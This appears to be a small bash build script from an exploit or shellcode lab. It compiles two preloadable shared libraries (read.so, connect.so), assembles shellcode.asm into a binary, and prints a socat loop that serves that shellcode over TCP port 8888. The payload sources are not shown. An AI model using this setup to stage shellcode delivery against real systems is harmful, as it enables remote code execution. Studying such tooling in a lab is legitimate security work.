#!/bin/bash

set -x

rm -rf read.so connect.so a.out shellcode.bin

gcc -Wall -fPIC -shared -o read.so read.c
gcc -Wall -fPIC -shared -o connect.so connect.c
nasm -f bin shellcode.asm -o shellcode.bin

echo 'Please run:'
echo 'while true; do socat TCP-LISTEN:8888,fork,reuseaddr FILE:shellcode.bin; done'
